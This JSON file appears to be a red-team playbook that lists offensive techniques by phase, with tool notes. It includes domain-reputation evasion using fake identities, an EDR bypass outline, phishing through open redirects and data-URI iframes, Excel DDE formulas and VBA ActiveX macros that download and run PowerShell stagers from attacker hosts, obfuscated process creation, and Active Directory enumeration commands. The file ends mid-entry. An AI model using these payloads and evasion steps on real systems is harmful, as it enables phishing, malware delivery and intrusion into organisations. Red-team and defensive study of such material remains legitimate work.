[
    {
        "id": "52259804-a1fb-4a97-be85-3544e4612ff9",
        "name": "Cobalt Strike",
        "phase": "00. Infrastructure",
        "ttp": "S0154",
        "external": true,
        "description": "Setup and configuring Cobalt Strike server",
        "content": "# Cobalt Strike\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[C2concealer]]\n"
        ],
        "tools": [
            "C2concealer"
        ],
        "steps": []
    },
    {
        "id": "f79f55a9-b0c5-4f0f-91f8-eb309e3b9d05",
        "name": "Payload Hosting",
        "phase": "00. Infrastructure",
        "ttp": "T1105",
        "external": true,
        "description": "Possibilities to host payloads externally without getting blocked (domain blocking vs. subdomain blocking)",
        "content": "# Payload Hosting\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "61bda7a3-a3ec-4a72-95b9-6282d0c59916",
        "name": "Redirector",
        "phase": "00. Infrastructure",
        "ttp": "T1583",
        "external": true,
        "description": "Setup of redirectors in order to avoid leaking the c2 servers ip address",
        "content": "# Redirectors\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[AzureC2Relay]]\n",
            "\n## [[cs2modrewrite]]\n",
            "\n## [[cs2webconfig]]\n"
        ],
        "tools": [
            "AzureC2Relay",
            "cs2modrewrite",
            "cs2webconfig"
        ],
        "steps": []
    },
    {
        "id": "f7454737-d821-4d25-a712-8fcac8537c17",
        "name": "Aged Domains",
        "phase": "00. Infrastructure",
        "ttp": "T1583.001",
        "external": true,
        "description": "Buying ages domains in order to bypass trust based network filtering",
        "content": "# Aged Domains\n\n## Purpose\nDomains with short lifespan (generally less than 30 days) are often marked as high risk and blocked at clients. Further domains are categorized in different categories such as finance but also phishing. Uncategorised domains or with category 'placeholder' are also considered high risk. \n\nOPSEC WARNING!: If possible, immediately request a new category, do not check the category beforehand! Otherwise your site is categorised anyways with 'uncategorised' instead of immediately what you want it to be. There is a chance that reassigning categories are verified by analysts. This increases the chance of the domain being categorised as something like 'placeholder' (which is a blocked category at some banks) \n\nThere are four ways to get a domain that will not be blocked by web categorization filters:\n* age and categorize a new domain\n* buy an expired domain with still a category assigned\n* use high trust domain as redirector (f.e. phishingdomain.azureedges.net)\n* buy a \u201csubdomain.eu.com\u201d domain (eu.com is not an official top level domain so many solutions look for the age and categorization to eu.com instead of subdomain.eu.com)\n\n## Buy an expired domain with still a category assigned\nThe previous method takes time (at least 30 days) to work. When a domain is needed in a shorter period, it is often better to buy an expired domain. The downside is that we have less control over how the domain will look like. \n\nWhen domains expire, often web categorization services are not updated quickly enough. By buying a domain that has just expired, but is still seen as valid and trusted by these services, we can set this up in a short time.\n\nThe following three steps will take care of this: \n* check for an expired domain on expireddomains.net (you will need to make a bogus account)\n* check if a category of \u2018financial'/\u2019business'/'technology'/\u2026 is still assigned to it by the desired web categorization service (see table above)\n* buy it on Eurodns\n\n## use high trust domain as redirector\nTODO: To be worked out\n\n## Buy a \u201csubdomain.eu.com\u201d domain\neu.com is not an official top level domain so many solutions look for the age and categorization to eu.com instead of subdomain.eu.com \n\nBy default you will get\n* age = 26 years\n* category = portal/search engine/web hosting (or something similar based on vendor)\n\nJust always check if the security solution you are up against is also checking things this way\n\nThis trick does not work against\n* umbrella client\n\n## Tools\n########\n########",
        "category": "Domains",
        "stealthy": false,
        "changes": [
            "\n## [[PowerView]]\n### Get-Domain\n\n```powershell\nGet-Domain\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```\n\n### Get-DomainPolicyData\n\n```powershell\nGet-DomainPolicyData | select -ExpandProperty SystemAccess\n\nMinimumPasswordAge           : 1\nMaximumPasswordAge           : 42\nMinimumPasswordLength        : 7\nPasswordComplexity           : 1\nPasswordHistorySize          : 24\nLockoutBadCount              : 0\nRequireLogonToChangePassword : 0\nForceLogoffWhenHourExpire    : 0\nClearTextPassword            : 0\nLSAAnonymousNameLookup       : 0\n```\n\n### Get-DomainSID\n\n```powershell\nGet-DomainSID\n```\n\n### Get SID of Group\n\n```powershell\nGet-DomainGroup -Identity \"Domain Admins\" -Domain evil.corp -Properties ObjectSid\n\nobjectsid                                   \n---------                                   \nS-1-5-21-378720957-2217973887-3501892633-512\n```\n\n### Convert SID\n\n```powershell\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\n```",
            "\n## [[SharpHound]]\nAll information\n> SharpHound.exe -c All --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip> --excludedcs\n\n#opsec: use --stealth, but that removes:\n* LoggedOn\n* DCOM\n* RPD\n* PSRemote\n* LocalAdmin\n\nAdditionally to snapshot\n> SharpHound.exe -c \"Container, LocalGroup, GPOLocalGroup, Session, LoggedOn, RDP, DCOM\" --randomfilenames --memcache -d <domain> --throttle 10000 --jitter 10 --stealth --zippassword \"RT2022!\" --ldapusername <user> --ldappassword \"<pw>\" --domaincontroller <ip>",
            "\n## [[SharpView]]\nSee [[PowerView]]\n> execute-assembly C:\\Tools\\SharpView\\SharpView\\bin\\Debug\\SharpView.exe Get-Domain",
            "\n## [[sublist3r]]\n",
            "\n## [[wmic]]\n```cmd\nDomain DC and Information\nwmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles\n\nList all users\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_user GET ds_samaccountname\n\nGet all groups\nwmic /NAMESPACE:\\\\root\\directory ldap PATH ds_group GET ds_samaccountname\n\nMembers of Domain Admins Group\nwmic path win32_groupuser where (groupcomponent=\"win32_group.name='domain admins',domain =='YOURDOMAINHERE'\")\n\nList all computers\nwmic /NAMESPACE: root directory ldap PATH ds_computer GET\nds_samaccountname\n```"
        ],
        "tools": [],
        "steps": []
    },
    {
        "id": "038b4138-cd4b-4c17-af49-06a83bede7d7",
        "name": "Categorize Domain",
        "phase": "00. Infrastructure",
        "ttp": "T1583.001",
        "external": true,
        "description": "Categorizing / Regategorizing domains in order to bypass trust based network filtering",
        "content": "## Setting up dummy site\nTwo steps: \n* point the domain to the dummy site you want it to be categorised to\n* request a category from the different services \n\n## Request a category\nRequest a new finance category on the following sites: \n\nIMPORTANT: Immediately request a new category, do not check the category beforehand! Otherwise your site is categorised anyways with 'uncategorised' instead of immediately what you want it to be. There is a chance that reassigning categories are verified by analysts. This increases the chance of the domain being categorised as something like 'placeholder' (blocked category at some banks)     \n\nSide note: Use fake details when asked for Name, Email, Company name. Create for example a protonmail account for email.\n\n| | |\n|---|---|\n| Fortinet | https//fortiguard.com/faq/wfratingsubmit <br/>https://www.fortiguard.com/learnmore#wf |\n| Bluecoat | https://sitereview.bluecoat.com/ <br/> - top domain is sufficient, no need for subdomains (if you submit subdomain, categories are not transferred to the domain, but categories for the domain are transferred to the subdomains as well) <br/> - it seems (this might be incorrect) that bluecoat manually verifies domains that have been requesting financial categories but automatically assigns other categories such as sport/recreation |\n| palo alto | https://urlfiltering.paloaltonetworks.com/ |\n| F5 | Not public |\n| Check Point | https://www.checkpoint.com/urlcat/ <br/>(even with free account not much you can do) |\n| McAfee | https://www.trustedsource.org/en/feedback/url?action=checksingle <br/>use an account |\n| Cisco WFA | Check category of domain <br/> https://talosintelligence.com/reputation_center/lookup <br/> There is limit of 10 requests <br/>Request new category: <br/> WSA FAQ: How do I verify which category a URL belongs to and submit a change request? <br/>1. Create bogus Cisco account <br/>2. Go to  https://talosintelligence.com/tickets <br/> 3. Click Create New Ticket.<br/> 4. Click Submit a Web Categorization Ticket. <br/> 5. Enter the URL, IP address, or domain of the website in question (up to 50 entries can be entered at a time) and click Get Category Data.<br/>6. In order to suggest the same category for multiple entries, choose from the categories in the box next to \"Bulk Select Download\" (up to five categories can be chosen). Then, from the Bulk Select Download drop-down list, choose Web Security Appliance.<br/> 7. In order to suggest categories for individual entries, choose from the categories box next to each entry in the column \"Suggested Content Categories\". Then, from the Select Platform drop-down list, choose Web Security Appliance.<br/> 8. Add comments and site descriptions to the box below the entries. Provide as much detail as possible.<br/> 9. Click SUBMIT.<br/> 10. Later, verify the status on the Talos Intelligence Tickets portal page.\n\n## Tools\n########\n########",
        "category": "Domains",
        "stealthy": false,
        "changes": [
            "\n## [[Chameleon]]\n\u26a0\ufe0f When attempting to categorise a site in Bluecoat, do not check the category first otherwise it will end up uncategorised! Individual hosts can however be categorised differently.\n\n```\nusage: chameleon.py [-h] [--proxy <proxy>] [--check] [--submit]\n                    [--domain <domain>]\n\noptional arguments:\n  -h, --help         show this help message and exit\n  --proxy <proxy>    Proxy type: a = all, b = bluecoat, m = mcafee, i = IBM\n                     Xforce\n  --check            Perform check on current category\n  --submit           Submit new category\n  --domain <domain>  Domain to validate\n```"
        ],
        "tools": [
            "Chameleon"
        ],
        "steps": []
    },
    {
        "id": "ee8a5da2-a82d-4bfe-a439-56c699242b97",
        "name": "Domain Fronting",
        "phase": "00. Infrastructure",
        "ttp": "T1090.004",
        "external": true,
        "description": "Domain Fronting in order to avoid burning the original IP of the c2 server",
        "content": "## Cloudfront\n\n## Tools\n########\n########",
        "category": "Domains",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "578f0caf-f3a9-49b4-a0ec-caf6b1903fd4",
        "name": "Password Spraying",
        "phase": "01. Initial Access",
        "ttp": "T1110.003",
        "external": true,
        "description": "Password spraying on services with cewl or",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Cewl]]\nSpider and build dictionary\n```\ncewl -w createWordlist.txt https://www.example.com\n```\n\nAdd minimum password length:\n```\ncewl -w createWordlist.txt -m 6 https://www.example.com\n```",
            "\n## [[SprayingToolkit]]\n"
        ],
        "tools": [
            "Cewl",
            "SprayingToolkit"
        ],
        "steps": []
    },
    {
        "id": "0af4c866-7ced-4851-882a-639295a66ca9",
        "name": "Crowdstrike",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "Bypass of Crowdstrike",
        "content": "# Crowdstrike\n\n## Execution\n* Lunch Loader.dll via rundll32.exe using ShellBrowserWindow\n* Loader.dll does Process Injection into own process with ETW and DLL blocking\n* CS beacon shellcode\n\n## Persistence\n1. [[OneDrive]]\n2. [[Teams]]\n\n### Notes\n* inline-execute assembly\n  * bypass dll-injection by edr during process creation\n\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "d0bd1d39-35f3-4735-9124-4593b6db1a2b",
        "name": "File properties",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "Macro leveraging file properties to hide its paylods and StdIn to avoid logging",
        "content": "# File Properties\n\n### Store Payload\n\n* Powershell command resides in the \"Author\" property\n  * Every time you edit the file, the \"Authors\" property will be deleted\n* Hide payload on custom Excel forms or even inside the working spreadsheet, in an encoded form\n\n### Store Arguments\n\n* PowerShell command's arguments via invocation with StdIn.WriteLine\n\n### Detection\n\n* AutoOpen is picked up by some AVs\n* Document_Open() is picked up by some AVs\n* AMSI (on Win10) will most likely block the payload\n* Variable is not used anywhere in the macro. Including some unused code is a simple obfuscation tactic though.\n\n### Execution\n\n1. Accessing the file's properties\n2. Leveraging Windows Script Host to run a program locally, manipulate the contents of the registry, create a shortcut, or access a system folder.\n3. Using WshShell object for executing PowerShell\n4. Append arguments via StdIn.WriteLine\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "fd695c1f-d629-43ed-adb2-2cfc31b4a91b",
        "name": "Loader",
        "phase": "01. Initial Access",
        "ttp": "TA0005",
        "external": false,
        "description": "NoDescription",
        "content": "",
        "category": "Evasion",
        "stealthy": false,
        "changes": [
            "\n## [[Sandman]]\n"
        ],
        "tools": [
            "Sandman"
        ],
        "steps": []
    },
    {
        "id": "9c8d6ddd-f5f3-4806-8db1-3b8af7d6113e",
        "name": "Parent-Process-Spoofing (PPS)",
        "phase": "01. Initial Access",
        "ttp": "T1134.004",
        "external": false,
        "description": "NoDescription",
        "content": "# Parent-Process-Spoofing\n\nSpoof via WMI call\nIn this instance, PowerShell will be a child of **WmiPrvSE.exe** rather than MS Word.\n``````\nDim proc As Object\nSet proc = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")\nproc.Create \"powershell\"\n``````\n\n## Detection\nFrom the Kibana home page, expand the menu in the top-left and then select **Discover** underneath the **Analytics** header.  In the search box, enter:\n\nDetect PowerPoint process injection\n``````\nevent.module : sysmon and event.type : process_start and process.parent.executable : *EXCEL.EXE | *WINWORD.EXE | *POWERPNT.EXE\n``````\n\n## Tools\n########\n########",
        "category": "Evasion",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "5ab08195-c6c7-4788-92df-265c1cd2bc44",
        "name": "Open Redirects",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Use open redirects to phish victims",
        "content": "It was discovered that there is an open redirect feature/vulnerability in Google.\nThe following steps will descript the usage of this so called feature:\n1. Create an *_ah* directory on our domain and inside it another directory called *conflogin*\n2. Place our phishing page inside the *conflogin* directory in index.html or index.php file\n3. Send the following link to our target `https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fappengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%3A%2F%2Fattacker.domain%2F&service=ah`\n\n\n## Tools\n########\n########",
        "category": "Phishing",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "ed543564-a7e6-471f-8696-8170f5148a89",
        "name": "Phishing",
        "phase": "01. Initial Access",
        "ttp": "T1566",
        "external": true,
        "description": "External Phishing via different tools to either gather credentials or plan a beacon",
        "content": "",
        "category": "Phishing",
        "stealthy": false,
        "changes": [
            "\n## [[mip22]]\n",
            "\n## [[NexPhisher]]\n"
        ],
        "tools": [
            "Espoofer",
            "MailSniper",
            "mip22",
            "NexPhisher",
            "ruler",
            "spoofcheck"
        ],
        "steps": []
    },
    {
        "id": "40131a8c-a25c-435c-8594-e0c8159ea994",
        "name": "Redirect Forms",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Use open redirects to phish victims",
        "content": "# Redirect forms with Paypal\n## Process\n1. Run on HTML form load\n2. Intercept all requests directed to PayPal\n3. Route all requests to our server, eventhough the victims browser still communicate with the original PayPal webpage.\n\n* capture_redirect.js: https://gist.github.com/anonymous/3bf8342c76eba4da3f660cbffa24f5d8\n* PayPal phishing HTML form: https://gist.github.com/anonymous/75b5eb6578bbc5bfcabe44e8fbb952ea\n* jquery hashchange.min.js: https://gist.github.com/anonymous/950a70cdebd3e78b6e88312fa7d93250\n\n\n## Data URIs\nA common technique for URL spoofing is abusing the data URI scheme.\nThe Data URI can show media content in a web browser without hosting the actual data on the internet.\nData URIs follow this scheme:\n`data:[<mediatype>][;base64],<data>`\nHere, `<mediatype>` is one of the MIME media types.\n* https://gist.github.com/anonymous/907cc8e9dcc43c6a4412e682e5d5c2cd\n\nNotice the amount of space characters `data:text/html,https://accounts.google.com` part is visible by the target. The data:text/html part could also be used in the following manner data:text/html;base64,[base64 encoded HTML source].\n```\n<meta http equiv=\"Refresh\" content=\"0;url=data:text/html,https://accounts.google.com\n<iframe src='http://attacker.domain' style='z-index:9999;overflow:hidden;position:fixed;top:0px;left:0px;bottom:0px;right:0px;width:100%;height:100%; border:none;margin:0;padding:0;'> Your browser doesn't support iFrames</iframe>\">\n```\n\n## Obfuscation\n* [Dotless IP addresses and URL Obfuscation](https://web.archive.org/web/20140702141151/http:/morph3us.org/blog/index.php?/archives/35-Dotless-IP-addresses-and-URL-Obfuscation.html)\n* [Out of Character: Use of Punycode and Homoglyph Attacks to Obfuscate URLs for Phishing](http://www.irongeek.com/i.php?page=security/out-of-character-use-of-punycode-and-homoglyph-attacks-to-obfuscate-urls-for-phishing)\n* [How to Obscure Any URL](http://www.pc-help.org/obscure.htm#how)bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/)\n* [Unicode Domains are bad](https://www.vgrsec.com/post20170219.html)\n* [Phishing with Unicode Domains](https://www.xudongz.com/blog/2017/idn-phishing/)\n\n\n## Tools\n########\n########",
        "category": "Phishing",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "2225c5d5-2051-472a-a918-a3f8a9bd00a1",
        "name": "MS16-032 (DDE)",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "MS15-032 (DDE) vuln",
        "content": "# Exploiting MS16-032 via Excel DDE without macros\nDDE = transfer data between applications, a form of Inter-Process Communication (IPC)\nExecute cmd and the second part is the argument.\n```=cmd|'/c calc.exe'!A1```\n* Arguments have to be inside single quotes \n* Length restrictions on both the executable and the arguments\n* BYPASS: instruct powershell to load a script\n\nbase64 encoded\n```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\"https://trusted.domain/script.base64\\\");powershell -e $e'!A1```\n\nplain .ps1\n```=cmd|'/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\"https://trusted.domain/script.ps1\\\");IEX $e'!A1```\n\nbat file via webdav (stealthier)\n```=cmd|'/c \\\\evilserver.com\\sp.bat;IEX $e'!A1```\n\n## MS16-032 via excel DDE functionality\n https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html",
        "category": "Office",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "2e4f5fac-80a7-4250-885d-d01f3d794462",
        "name": "Office Links",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Office-handeld Links",
        "content": "# Office Links\n\nWhen a user clicks on an HTML page having the following format, Microsoft Word will be run to handle the opening of the served document. Links like that could be misused for phishing purposes.\n\n```html\n<html>\n    <a href=\"ms-word:nft|u|http://attacker.domain/malicious.docx\">Click Me</a>\n</html>\n```\n\n## Tools\n########\n########",
        "category": "Office",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "2ca0631d-690f-4343-a033-065aabf2d8eb",
        "name": "OLE",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Object Linking and Embedding Objects in case macros are restricted.",
        "content": "# OLE (Object Linking and Embedding Objects)\nObject Linking and Embedding(OLE) is a proprietary technology developed by Microsoft that allows embedding and linking to documents and other objects.\nFor example, a user can embed a spreadsheet (which is data that belongs to the spreadsheet application) in a word-processing document.\nWhen the word-processing application displays the document to the user, it can establish a connection and can interact with the spreadsheet application to display the spreadsheet data to the user\n\nEmbed for example:\n* Malicious Office documents\n* VBS files \n* JS files \n* EXE files \n* HTA files \n* CHM files\n\nCustomize both the extension and the icon\n\n## Payload\nInsert > Object > object type list choose package > choose file > customize filename + extension + icon\n\n## Execution\nAutotrigger via custom automation\nChoose OLE object to embed > Animations > Add Navigation > OLE Action verbs > Activate Contents\nAnimation tab > Animation Pane > navigate to the Animation Pane > choose object > right side down arrow = dropdown of the Object > Start after previous\n\n\n## Tools\n########\n########",
        "category": "Office",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "9e1695c5-c27b-45f5-a573-5a3449fb8ca8",
        "name": "ActiveX controls",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Using ActiveX controls in order to trigger execution via phishing",
        "content": "# ActiveX controls for macro execution\n\n\n\n\n## Store Payload\n\n* File -> Options -> Customize Ribbon -> Add developer tab\n* Developer tab -> Controls -> Legacy Tools -> More Options\n* More infos via here: http://www.greyhathacker.net/?p=948\n\n## Autorun\n\n| ActiveX Control | Subroutine name |\n| --------------- | --------------- |\n| Microsoft Forms 2.0 Frame | Frame1_Layout |\n| Microsoft Forms 2.0 MultiPage | MultiPage1_Layout |\n| Microsoft ImageComboBox Control, version 6.0 | ImageCombo21_Change |\n| Microsoft InkEdit Control | InkEdit1_GotFocus |\n| Microsoft InkPicture Control | InkPicture1_Painted, InkPicture1_Painting, InkPicture1_Resize |\n| System Monitor Control | SystemMonitor1_GotFocus, SystemMonitor1_LostFocus |\n| Microsoft Web Browser | WebBrowser1_BeforeNavigate2, WebBrowser1_BeforeScriptExecute, WebBrowser1_DocumentComplete, WebBrowser1_DownloadBegin, WebBrowser1_DownloadComplete, WebBrowser1_FileDownload, WebBrowser1_NavigateComplete2, WebBrowser1_NavigateError, WebBrowser1_ProgressChange, WebBrowser1_PropertyChange, WebBrowser1_SetSecureLockIcon, WebBrowser1_StatusTextChange, WebBrowser1_TitleChange |\n\n## Execution\n\n1. Uses InkEdit - a subroutine coming from an ActiveX control to execute its code.\n2. downloading and executing an executable file using cmd.exe and PowerShell\n\n### On disc\n\n```vb\nSub InkEdit1_GotFocus()\nRun = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus)\nEnd Sub\n```\n\n### In memory\n\n```vb\nSub InkEdit1_GotFocus()\n    Debugging\nEnd Sub\n\nPublic Function Debugging() As Variant\n    Const HIDDEN_WINDOW = 0\n    strComputer = \".\"\n    Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n    Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = HIDDEN_WINDOW\n    Set objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n    objProcess.Create \"powe\" & \"rshell.e\" & \"xe\" & \" -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}\"\nEnd Function\n```\n\n## Detection\n\n* Notification: \"Some active content has been disabled, Click here to find out more\"\n* On disc and in-memory execution\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "97175308-e407-4747-8cad-77bce50b0c81",
        "name": "Clean Document",
        "phase": "01. Initial Access",
        "ttp": "T1000",
        "external": true,
        "description": "Clean document proerties in order to hide your details",
        "content": "# Clean Document Information\n\n**File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "f9f9bae5-8877-40b0-8adc-0dfd1f81d6d0",
        "name": "Macros",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "Macros used for phishing attacks via office",
        "content": "# Macros\n\nMacros can be written in one of the following languages:\n* visual basic macros (excel 5.0)\n* excel 4.0\n\n| File extension | File Type           | Macros Permitted                                            |\n| -------------- | ------------------- | ----------------------------------------------------------- |\n| DOCX           | compressed document | No, with remote template                                    |\n| DOTX           | compressed template | No                                                          |\n| DOCM           | compressed document | Yes, Can be renamed and keep macro capabilities (RTF files) |\n| DOTM           | compressed template | Yes                                                         |\n\nRemote template in DOCX: File->Options->Add-Ins->Manage:Templates->Go\n\nIdentify associated filetypes:\n```\nassoc | findstr /i \u201cword\u201d\nassoc | findstr /i \u201cexcel\u201d\nassoc | findstr /i \u201cpowerp\u201d\n```\n\nInformation about macros\n* cross-platform\n* Sandboxed on macOS\n* direct WinAPI access\n* COM object access\n* GPOs applied per application\n* Access scripts (.accde), manfile, \n* It is possible to sign payloads\n* protected view since 2016\n\t* does not work for .slk, .one, .pub, .accde\n\t* still enable content (maros) required\n\t* change macro alert via AutoOpen / Document_Open() (https://www.greyhathacker.net/?tag=activex)\n\t* go legacy dialog: add the visibility=\"hidden\" attribute to the workbookView element in the xl/workbook.xml file\n\t* remote template injection, settings.xml.rels file inside the docx\n\t!(Images/RemoteTemplateInjection.png \"macro\")\n\t\n\t* winapi + com\n\t![winapi](/Images/macro-winapi-com-1.png \"winapi1\".png)\n\t![winapi1](/Images/macro-winapi-com-1.png \"winapi\".png)\n* OLE objects: can be embedded inside Office documents\n\t* .exe, .bat, .lnk, .hta, .vba, .js\n\t* there is a blocklist since 2016\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [
            "\n## [[VBad]]\n"
        ],
        "tools": [
            "VBad"
        ],
        "steps": []
    },
    {
        "id": "df05a83f-0203-450a-b074-21c56a5ae319",
        "name": "Remote Template Injection",
        "phase": "01. Initial Access",
        "ttp": "T1221",
        "external": true,
        "description": "Macros used for phishing attacks via office",
        "content": "",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "56f2ec18-fc38-4502-9cb1-8d8278cf8e09",
        "name": "Shellcode Injection",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "VBA Shellcode injection",
        "content": "# Macro Shellcode injection\n\n#### Detection\nhttps://labs.mwrinfosecurity.com/assets/BlogFiles/one-template-to-rule-them-all-t2.pdf\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "bea54459-bba3-4535-80a6-6ebacb32a3b9",
        "name": "VBA",
        "phase": "01. Initial Access",
        "ttp": "T1059.005",
        "external": true,
        "description": "VBA execution via Office",
        "content": "# VBA\nYou can create a macro in a Word document by going to **View > Macros > Create**.  Change the \"Macros in\" field from \"All active templates and documents\" to \"Document 1\".\n\nTrigger Functions\n* AutoOpen\n\n\nPoC.vb\n``````vb\nSub AutoOpen()\n\n  Dim Shell As Object\n  Set Shell = CreateObject(\"wscript.shell\")\n  Shell.Run \"calc\"\n\nEnd Sub\n``````\n\n#OPSEC Word spawning a process highly suspicious [[Parent-Process-Spoofing (PPS)]]\n\n\n## Tools\n########\n########",
        "category": "Macros",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "7484fee0-1307-4988-9180-50aa807f5f22",
        "name": "COM",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an COM file into the STARTUP folder to archive persistence and execute code when Outlook being launched",
        "content": "## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Invoke-DCOM",
            "PowerShell",
            "Process Hacker",
            "Process Monitor"
        ],
        "steps": []
    },
    {
        "id": "a29d32b3-2e3e-44b5-8e75-5df624bd5deb",
        "name": "WLL",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an WLL file into the STARTUP folder to archive persistence and execute code when WLL being launched",
        "content": "## Path\n> %appdata%\\Microsoft\\Word\\STARTUP\n\n\n## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "9b754c7b-50bf-4052-a690-45a4dd4be2f3",
        "name": "XLL",
        "phase": "01. Initial Access",
        "ttp": "T1137.006",
        "external": true,
        "description": "Dropping an XLL file into the XLSTART folder to archive persistence and execute code when XLL being launched",
        "content": "## Path\n> %appdata%\\Microsoft\\Excel\\XLSTART\n\n## Tools\n########\n########",
        "category": "Excel",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "f89c3e5e-623f-4f14-9b97-21256c0ca971",
        "name": "Custom Actions",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "NoDescription",
        "content": "# Macros on PowerPoint\n* Use \"Custom Actions\"\n    0. Activate Dev Tab (File->Options->Customize Ribbon)\n    1. Developer Tab\n    2. Visual Basic\n    3. Insert choose Model\n    4. Insert\n    5. Choose an item to associate the action with \n    6. \"Mouse Click\" or Mouse Over\n    7. Run macro\n\n* Office 2007 Custom UI\n    * Insert the module and save PowerPoint as a macro-supporting PowerPoint file\n    * Unzip the PowerPoint file\n    * Edit the _rels/.rels file to add the following line right before the last ```</Relationships>. <Relationship  Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target=\u201c/customUI/customUI.xml\u201d Id=\u201dRd6e72c29d34a427e\u201d />```\n    * Create a new directory on the same level as the _rels directory called \"customUI\"\n    * Inside customUI directory create a customUI.xml containing ```<customUI xmlns=http://schemas.microsoft.com/office/2006/01/customui onLoad=\u201dname of your VBA module\u201d ></customUI>```\n    * Zip the whole directory and rename it to the filename you used to save the original PowerPoint presentation\n\n## Detection\n\n\n## Tools\n########\n########",
        "category": "PowerPoint",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "f9b9cc06-dbda-46ff-ad6e-de0537990f81",
        "name": "Custom UI part",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "NoDescription",
